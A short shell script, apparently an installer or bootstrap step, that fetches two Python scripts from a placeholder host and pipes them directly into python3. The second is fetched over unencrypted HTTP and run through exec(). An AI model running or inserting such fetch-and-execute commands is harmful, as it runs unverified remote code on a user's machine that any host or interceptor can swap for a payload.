#!/bin/sh
curl -sSL https://dl.example.net/get.py | python3 - --version 1.2
curl -s http://dl.example.net/a.py | python3 -c "import sys;exec(sys.stdin.read())"
